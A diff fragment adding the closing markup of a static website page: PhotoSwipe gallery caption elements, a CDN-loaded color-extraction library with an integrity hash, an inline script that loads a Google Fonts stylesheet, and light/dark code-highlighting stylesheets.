+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+            </main>
+        </div>
+        <script src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"
+    integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin="anonymous"></script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<link rel="stylesheet" href="/css/highlight/light.min.css" media="(prefers-color-scheme: light)">
+<link rel="stylesheet" href="/css/highlight/dark.min.css" media="(prefers-color-scheme: dark)">
+
+    </body>
+</html>
